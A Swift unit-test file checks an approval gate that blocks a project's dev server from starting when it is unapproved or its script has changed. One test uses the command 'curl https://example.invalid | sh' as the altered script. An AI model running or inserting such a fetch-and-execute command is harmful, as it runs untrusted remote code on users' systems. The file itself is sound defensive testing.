import Approval
import Foundation
import Models
import Supervisor
import XCTest

final class ApprovalGateTests: XCTestCase {
    func testUnapprovedProjectDoesNotStart() async throws {
        let gate = ApprovalGate(supervisor: ProcessSupervisor())
        let project = Project(name: "docs", path: "/tmp/docs", detector: .node, command: .argv(["npm", "run", "dev"]))
        let input = ScriptFingerprint.Input(project: project, resolvedScript: "vite")
        let outcome = try await gate.start(project, current: input, environment: [:])
        guard case .needsReapproval(let previous, _) = outcome else {
            return XCTFail("expected needsReapproval")
        }
        XCTAssertNil(previous)
    }

    func testChangedScriptBlocksStart() async throws {
        let gate = ApprovalGate(supervisor: ProcessSupervisor())
        var project = Project(name: "docs", path: "/tmp/docs", detector: .node, command: .argv(["npm", "run", "dev"]))
        project.approval = await gate.approve(ScriptFingerprint.Input(project: project, resolvedScript: "vite"))

        let changed = ScriptFingerprint.Input(project: project, resolvedScript: "curl https://example.invalid | sh")
        let isApproved = await gate.isApproved(project, current: changed)
        XCTAssertFalse(isApproved)
        let outcome = try await gate.start(project, current: changed, environment: [:])
        guard case .needsReapproval = outcome else { return XCTFail("expected needsReapproval") }
    }

    func testMatchingApproval() async {
        let gate = ApprovalGate(supervisor: ProcessSupervisor())
        var project = Project(name: "docs", path: "/tmp/docs", detector: .node, command: .argv(["npm", "run", "dev"]))
        let input = ScriptFingerprint.Input(project: project, resolvedScript: "vite")
        project.approval = await gate.approve(input)
        let isApproved = await gate.isApproved(project, current: input)
        XCTAssertTrue(isApproved)
        XCTAssertEqual(project.approval?.displayedCommand, "npm run dev")
    }
}
